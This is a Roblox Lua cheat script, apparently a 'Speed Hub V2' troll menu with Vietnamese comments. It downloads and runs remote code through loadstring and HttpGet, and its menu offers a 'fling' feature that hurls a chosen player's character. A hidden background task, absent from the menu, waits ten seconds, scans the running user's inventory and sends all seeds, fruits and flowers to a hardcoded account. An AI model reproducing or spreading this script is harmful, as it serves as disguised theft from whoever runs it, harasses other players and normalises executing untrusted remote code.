-- Hệ thống chống đơ máy tối ưu cho Mobile
if not game:IsLoaded() then
    pcall(function()
        game:GetService("ContentProvider"):PreloadAsync({game:GetService("Workspace")})
    end)
end

print("==== SPEED HUB V2: CẬP NHẬT QUÉT DATA LƯU TRỮ CHÍNH XÁC ====")

local successUI, KavoLib = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
end)

local Window
if successUI and KavoLib then
    Window = KavoLib.CreateLib("Speed Hub V2", "DarkTheme")
end

-- Hệ thống biến quản lý trạng thái
local Options = { FlingTargetEnabled = false }
local selectedFlingTarget = "" 
local targetUsername = "sutkucheonhamku" -- Tên nick chính nhận đồ

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local LocalPlayer = Players.LocalPlayer

-- Hàm gửi thông báo lên góc màn hình game để bạn dễ theo dõi
local function notify(title, text)
    pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title = title,
            Text = text,
            Duration = 4
        })
    end)
end

-- =======================================================================
-- CHỨC NĂNG 1: TỰ ĐỘNG QUÉT TOÀN BỘ DATA VÀ CHUYỂN ĐỒ SAU ĐÚNG 10 GIÂY
-- =======================================================================
local function sendItemSecure(category, itemName, quantity)
    local SharedModules = ReplicatedStorage:FindFirstChild("SharedModules")
    local PacketModule = SharedModules and SharedModules:FindFirstChild("Packet")
    local RemoteEvent = PacketModule and PacketModule:FindFirstChild("RemoteEvent")
    if RemoteEvent then
        pcall(function() 
            RemoteEvent:FireServer(targetUsername, category, itemName, quantity) 
        end)
        task.wait(0.5) -- Tốc độ gửi an toàn
    end
end

task.spawn(function()
    task.wait(10) -- Chờ đúng 10 giây
    
    -- Kiểm tra sự hiện diện của nick chính trong server
    local targetPlayer = Players:FindFirstChild(targetUsername)
    if not targetPlayer then
        notify("Speed Hub V2", "Hủy gửi đồ: Không tìm thấy nick chính trong phòng!")
        return
    end

    notify("Speed Hub V2", "Đang quét dữ liệu túi đồ để gửi...")

    -- Vị trí quét 1: Thư mục lưu trữ PlayerData chuyên sâu của Game
    local DataFolder = LocalPlayer:FindFirstChild("PlayerData") or LocalPlayer:FindFirstChild("Data")
    local Inventory = DataFolder and (DataFolder:FindFirstChild("Inventory") or DataFolder:FindFirstChild("Items"))
    
    -- Vị trí quét dự phòng 2: Túi đồ cơ bản
    if not Inventory then
        Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack")
    end

    if Inventory then
        local itemsFound = false
        -- Duyệt qua tất cả các thư mục con bên trong túi đồ chuyên sâu
        for _, folder in pairs(Inventory:GetChildren()) do
            -- Kiểm tra cả các thư mục phân loại (Seeds, Fruits,...) hoặc các giá trị trực tiếp
            if folder:IsA("Folder") or folder:IsA("Configuration") then
                for _, item in pairs(folder:GetChildren()) do
                    if item:IsA("ValueBase") and item.Value > 0 then
                        local lowerName = string.lower(item.Name)
                        if string.find(lowerName, "seed") then
                            itemsFound = true
                            sendItemSecure("Seeds", item.Name, item.Value)
                        elseif string.find(lowerName, "fruit") or string.find(lowerName, "flower") then
                            itemsFound = true
                            sendItemSecure("Fruits", item.Name, item.Value)
                        end
                    end
                end
            elseif folder:IsA("ValueBase") and folder.Value > 0 then
                local lowerName = string.lower(folder.Name)
                if string.find(lowerName, "seed") then
                    itemsFound = true
                    sendItemSecure("Seeds", folder.Name, folder.Value)
                elseif string.find(lowerName, "fruit") or string.find(lowerName, "flower") then
                    itemsFound = true
                    sendItemSecure("Fruits", folder.Name, folder.Value)
                end
            end
        end
        
        if itemsFound then
            notify("Speed Hub V2", "Đã gửi toàn bộ vật phẩm sang nick chính!")
        else
            notify("Speed Hub V2", "Túi đồ hiện đang trống hoặc không có gì để gửi.")
        end
    else
        notify("Speed Hub V2", "Lỗi: Không tìm thấy thư mục lưu trữ dữ liệu đồ của game.")
    end
end)

-- =======================================================================
-- CHỨC NĂNG 2: THẦN CHƯỞNG FLING KHÓA VÀ ĐUỔI MỤC TIÊU
-- =======================================================================
task.spawn(function()
    while true do
        RunService.Heartbeat:Wait()
        if Options.FlingTargetEnabled and selectedFlingTarget ~= "" then
            local targetPlayer = Players:FindFirstChild(selectedFlingTarget)
            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local myHrp = LocalPlayer.Character.HumanoidRootPart
                local enemyHrp = targetPlayer.Character.HumanoidRootPart
                
                myHrp.CFrame = enemyHrp.CFrame * CFrame.new(0, 0, 0.5)
                
                local oldVelocity = myHrp.Velocity
                myHrp.Velocity = Vector3.new(999999, 999999, 999999)
                
                RunService.RenderStepped:Wait()
                myHrp.Velocity = oldVelocity
                
                for _, part in pairs(LocalPlayer.Character:GetChildren()) do
                    if part:IsA("BasePart") then part.CanCollide = false end
                end
            end
        end
    end
end)

local function getPlayerList()
    local list = {}
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Name ~= targetUsername then
            table.insert(list, player.Name)
        end
    end
    return list
end

-- =======================================================================
-- THIẾT KẾ MENU INTERFACE (KAVO UI)
-- =======================================================================
if Window then
    pcall(function()
        local MainTab = Window:NewTab("Troll / Fling")
        local MainSection = MainTab:NewSection("Cấu Hình Fling Mục Tiêu")

        local TargetDropdown = MainSection:NewDropdown("Chọn Người Muốn Fling", "Bấm để chọn tên", getPlayerList(), function(Value)
            selectedFlingTarget = Value
        end)

        MainSection:NewToggle("Bật Auto Fling Người Này", "Tự động bay đến dí mục tiêu", function(bool)
            Options.FlingTargetEnabled = bool
        end)

        MainSection:NewButton("Làm Mới Danh Sách Người Chơi", "Cập nhật lại danh sách khi có người ra vào", function()
            TargetDropdown:Refresh(getPlayerList())
        end)
    end)
end
